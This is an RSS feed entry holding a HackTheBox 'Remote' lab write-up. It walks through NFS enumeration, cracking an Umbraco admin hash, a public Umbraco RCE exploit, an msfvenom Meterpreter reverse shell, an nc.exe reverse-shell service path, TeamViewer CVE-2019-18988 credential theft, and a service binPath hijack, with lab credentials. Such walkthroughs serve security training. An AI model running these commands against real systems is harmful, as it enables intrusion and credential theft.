<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>CVE-2019-18988 on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/cve-2019-18988/</link>
    <description>Recent content in CVE-2019-18988 on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 05 Apr 2021 20:21:24 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/cve-2019-18988/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Remote</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-remote/</link>
      <pubDate>Mon, 05 Apr 2021 20:21:24 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-remote/</guid>
      <description>Enumerating public NFS and gain access to sensitive files</description>
      <content:encoded><![CDATA[<p>Remote features an instance of Umbraco CMS which is vulnerable to an authenticated remote code execution (RCE). Enumeration on publicly accessible backup on NFS share finds credentials, which allows me to gain a foothold on the system. Internal enumeration with WinPEAS finds two interesting privilege escalation vectors, the first one with TeamViewer7 and the other one is the ability to modify and restart an unquoted service path. TeamViewer7 is found to be vulnerable to CVE-2019-18988, <code>Metasploit</code> has a module to exploit this CVE and harvest the TeamViewer credentials. The credentials are work with the administrator account.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>NFS enumeration</li>
<li>Umbraco CMS 7.12.4 exploitation</li>
<li>Metasploit</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>metasploit - Preinstalled in Kali Linux</li>
<li>nfs-common - <code>apt install nfs-common</code></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
$ nmap -sC -sV -oA scans/initial-remote <span style="color:#e6db74">&#39;10.10.10.180&#39;</span>
</code></pre></div><ul>
<li><code>-sC</code>, to scan with default script</li>
<li><code>-sV</code>, to scan service version</li>
<li><code>-oA</code>, to save the output to all format (xml, nmap, gnmap)</li>
<li><code>-v</code>, verbose mode.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">... &lt;snip&gt; ...
Host is up (0.20s latency).
Not shown: 993 closed ports
PORT STATE SERVICE VERSION
21/tcp open ftp Microsoft ftpd #1
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_ SYST: Windows_NT
80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) #2
|_http-title: Home — Acme Widgets
111/tcp open rpcbind 2–4 (RPC #100000) 
| rpcinfo: 
| program version port/proto service 
| 100000 2,3,4 111/tcp rpcbind 
| 100000 2,3,4 111/tcp6 rpcbind 
| 100000 2,3,4 111/udp rpcbind 
| 100000 2,3,4 111/udp6 rpcbind 
| 100003 2,3 2049/udp nfs 
| 100003 2,3 2049/udp6 nfs 
| 100003 2,3,4 2049/tcp nfs 
| 100003 2,3,4 2049/tcp6 nfs 
| 100005 1,2,3 2049/tcp mountd 
| 100005 1,2,3 2049/tcp6 mountd 
| 100005 1,2,3 2049/udp mountd 
| 100005 1,2,3 2049/udp6 mountd 
| 100021 1,2,3,4 2049/tcp nlockmgr 
| 100021 1,2,3,4 2049/tcp6 nlockmgr 
| 100021 1,2,3,4 2049/udp nlockmgr 
| 100021 1,2,3,4 2049/udp6 nlockmgr 
| 100024 1 2049/tcp status 
| 100024 1 2049/tcp6 status 
| 100024 1 2049/udp status 
|_ 100024 1 2049/udp6 status 
135/tcp open msrpc Microsoft Windows RPC 
139/tcp open netbios-ssn Microsoft Windows netbios-ssn 
445/tcp open microsoft-ds? 
2049/tcp open mountd 1–3 (RPC #100005) #3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:
|_clock-skew: -25s
| smb2-security-mode: 
| 2.02: 
|_ Message signing enabled but not required
| smb2-time: 
| date: 2020–03–28T21:04:26
|_ start_date: N/A
... &lt;snip&gt; ...
</code></pre></div><p>The result shows a bunch of open ports.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-21---ftp">TCP 21 - FTP</h3>
<p>Anonymous login is allowed, but nothing here.</p>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p><img src="https://miro.medium.com/max/955/1*yMpV5s03RUP6MvF9J_2euw.png" alt="img" style="zoom:80%;" /></p>
<p>In contact menu, there&rsquo;s a button that points to <code>http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms</code></p>
<p><img src="imgs/image-20210406053255081.png" alt="image-20210406053255081" style="zoom:80%;" /></p>
<p>The link brought me into Umbraco&rsquo;s login page.</p>
<center>
<img src="imgs/image-20210406053525360.png" alt="image-20210406053525360" style="zoom:80%;" />
</center>
Brute forcing some common credentials with Burp doesn't show any difference.
<h3 id="tcp-2049---nfs">TCP 2049 - NFS</h3>
<p>NFS shares can be enumerated using the <code>showmount</code> command.</p>
<blockquote>
<p>If you don’t have it, install with <code>sudo apt install nfs-common</code></p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
$ showmount -e <span style="color:#e6db74">&#39;10.10.10.180&#39;</span>
Export list <span style="color:#66d9ef">for</span> 10.10.10.180:
/site_backups
</code></pre></div><p>I can mount the share to my Kali because it is accessible to everyone.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
$ mount -t nfs 10.10.10.180:/site_backups /mnt/iamf
</code></pre></div><p><img src="https://miro.medium.com/max/943/1*L5gt8QgAvhpN0jSNRxrN6g.png" alt="img" style="zoom:80%;" /></p>
<p>When I ran the <code>find</code> command on the mounted NFS, I discovered two interesting files: <code>embraco.config</code> and umbraco.sdf.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «iamf» «10.10.14.3»
$ find . -type f 2&gt;/dev/null

...&lt;snip&gt;...
./App_Data/TEMP/PluginCache/umbraco-plugins.INTRANET.list
./App_Data/TEMP/PluginCache/umbraco-plugins.REMOTE.hash
./App_Data/TEMP/PluginCache/umbraco-plugins.REMOTE.list
./App_Data/umbraco.config
./App_Data/Umbraco.sdf
./App_Plugins/ModelsBuilder/modelsbuilder.controller.js
./App_Plugins/ModelsBuilder/modelsbuilder.htm
./App_Plugins/ModelsBuilder/modelsbuilder.resource.js
...&lt;snip&gt;...
</code></pre></div><p><code>umbraco.config</code> is a config file formatted in xml and <code>umbraco.sdf</code> is a database file.</p>
<center>
<img src="imgs/image-20210406054737539.png" alt="image-20210406054737539" style="zoom:80%;" />
<p><img src="https://miro.medium.com/max/786/1*4tt979oRubnll3RguRAQDA.png" alt="img" style="zoom:80%;" /></p>
</center>
<p>The config file doesn&rsquo;t store credentials.</p>
<p>Since the database file is a binary, the <code>strings</code> and <code>grep</code> command can be used to display some readable strings such as &ldquo;admin&rdquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
$ strings App_Data/umbraco.sdf | grep -i admin

...&lt;snip&gt;...
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa<span style="color:#f92672">{</span>“hashAlgorithm”:”SHA1<span style="color:#e6db74">&#34;}en-USf8512f97-cab1–4a4b-a49f-0a2054c47a1d
</span><span style="color:#e6db74">adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{“hashAlgorithm”:”SHA1&#34;</span><span style="color:#f92672">}</span>admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span style="color:#f92672">{</span>“hashAlgorithm”:”SHA1<span style="color:#e6db74">&#34;}admin@htb.localen-US82756c26–4321–4d27-b429–1b5c7c4f882f
</span><span style="color:#e6db74">User “admin” &lt;admin@htb.local&gt;192.168.195.1User “admin” &lt;admin@htb.local&gt;umbraco/user/password/changepassword change
</span><span style="color:#e6db74">User “admin” &lt;admin@htb.local&gt;192.168.195.1User “admin” &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success
</span><span style="color:#e6db74">User “SYSTEM” 192.168.195.1User “admin” &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, 
</span><span style="color:#e6db74">...&lt;snip&gt;...
</span></code></pre></div><p>From the output above, I can only guess this is the correct pair of username and password. <code>admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa</code></p>
<p>The password that was identified as SHA1 can be cracked online with crackstation. The password is <code>bacondandcheese</code></p>
<p><img src="imgs/image-20210406055746058.png" alt="image-20210406055746058" style="zoom:80%;" /></p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-iis-apppool">Shell as IIS apppool</h3>
<h4 id="access-on-umbraco-cms">Access on Umbraco CMS</h4>
<p>The credential can be used on Umbraco CMS.</p>
<p><img src="https://miro.medium.com/max/1635/1*PMsbzYlHMk5adNFVMz2Oeg.png" alt="img" style="zoom:80%;" /></p>
<p>I can see the CMS version by accessing the menu on the left side. A quick search on Google reveals the current version is vulnerable to RCE.</p>
<blockquote>
<p><a href="https://www.exploit-db.com/exploits/46153">Offensive Security&rsquo;s Exploit Database ArchiveUmbraco CMS 7.12.4 - (Authenticated) Remote Code Execution.. webapps exploit for ASPX platformwww.exploit-db.com</a></p>
</blockquote>
<p>I copied the exploit and ran it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Umbraco-RCE» «10.10.14.3»
$ python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a ‘ls c:/’
</code></pre></div><p><img src="imgs/image-20210406060557239.png" alt="image-20210406060557239" style="zoom:80%;" /></p>
<h4 id="persistent-shell---meterpreter">Persistent Shell - Meterpreter</h4>
<p>I can upgrade the RCE to a persistent shell by sending a PowerShell one liner payload or use <code>msfvenom</code> to craft a payload.</p>
<blockquote>
<p>I don&rsquo;t remember correctly, but I think I messed up with the one liner, so I go with <code>msfvenom</code>.</p>
</blockquote>
<p>Upload features from Umbraco didn&rsquo;t restrict <code>.exe</code> file. It is located on <code>/media</code> and the directory of the uploaded file is located on <code>C:/inetpub/wwwroot/media/[itemID]/payload.exe</code></p>
<p><img src="imgs/image-20210406062610944.png" alt="image-20210406062610944" style="zoom:80%;" /></p>
<p>I&rsquo;ll create a executable reverse shell and upload it to Umbraco <code>/media</code> page and have listener using <code>Metasploit</code> listening on the specified port.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.23 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -a x86 -f exe &gt; fremote.exe
</code></pre></div><p>Then I&rsquo;ll just execute my payload on <code>C:/inetpub/wwwroot/media/1136/fremote.exe</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
$ python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c cmd.exe -a ‘C:/inetpub/wwwroot/media/1136/fremote.exe’
</code></pre></div><p><img src="imgs/image-20210406063758369.png" alt="image-20210406063758369" style="zoom:80%;" /></p>
<p>I can spawn PowerShell by typing</p>
<pre><code>execute -f powershell.exe
</code></pre><center>
<img src="imgs/image-20210406063911685.png" alt="image-20210406063911685" style="zoom:80%;" />
</center>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as--administrator">Shell as  Administrator</h3>
<p>For the last part, I have two options to gain administrator or system access: TeamViewer7 CVE-2019-18988 and hijacking <code>UsoSvc</code> . For <code>UsoSvc</code>, I&rsquo;m still unsure if it came from the box or was caused by other players, but I&rsquo;ll show both.</p>
<h4 id="teamviewer7-cve-2019-18988">TeamViewer7 CVE-2019-18988</h4>
<p><code>WinPEAS</code> shows there&rsquo;s TeamViewer7 service currently running. This version is vulnerable to CVE-2019-18988</p>
<p>From <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-18988:">https://nvd.nist.gov/vuln/detail/CVE-2019-18988:</a></p>
<blockquote>
<p>It used a shared AES key for all installations since at least as far back as v7.0.43148, and used it for at least OptionsPasswordAES in the  current version of the product</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">========================================(Services Information)========================================
... &lt;snip&gt; ... 
    TeamViewer7(TeamViewer GmbH - TeamViewer 7)[&#34;C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe&#34;] - Auto - Running
    TeamViewer Remote Software
   =================================================================================================                
    
    UsoSvc(Update Orchestrator Service)[cmd \c C:\Users\nc.exe 10.10.14.8 4444 -e cmd.exe] - Auto - Stopped - No quotes and Space detected
    YOU CAN MODIFY THIS SERVICE: AllAccess, Start
    Manages Windows Updates. If stopped, your devices will not be able download and install latest udpates.
   =================================================================================================   
... &lt;snip&gt; ... 
</code></pre></div><p>Because <code>metasploit</code> has a post module for that CVE, so I could simply the background current session and run the post module.</p>
<pre><code>meterpreter &gt; run post/windows/gather/credentials/teamviewer_passwords
</code></pre><p><img class="img-container" src="imgs/image-20210406070901576.png" alt="image-20210406070901576"  />
</p>
<h4 id="remote-access---evil-winrm">Remote Access - Evil-WinRM</h4>
<p>The password itself is reused by the administrator account.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
$ evil-winrm -u administrator -p <span style="color:#e6db74">&#39;!R3m0te!&#39;</span> -i htb.remote
</code></pre></div><center>
<p><img class="img-container" src="imgs/image-20210406070830154.png" alt="image-20210406070830154"  />
</p>
</center>
<h4 id="alternative-unquoted-service-path---usosvc">(Alternative) Unquoted Service Path - UsoSvc</h4>
<p>If this unquoted service path was originally from the box, I could just modify the <code>UsoSvc</code> executable path to point to my previous uploaded payload</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\&gt; sc.exe config usosvc binPath=<span style="color:#e6db74">&#34;C:/inetpub/wwwroot/media/1136/fremote.exe&#34;</span>
</code></pre></div><p>I&rsquo;ll set <code>netcat</code> listener on port 4444</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
$ nc -nvlp <span style="color:#ae81ff">4444</span>
</code></pre></div><p>Now on Remote, I can just start the service.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\&gt; sc.exe start usosvc
</code></pre></div><p>I don&rsquo;t have any screenshots, but that should work.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/nfs-service-pentesting">https://book.hacktricks.xyz/pentesting/nfs-service-pentesting</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
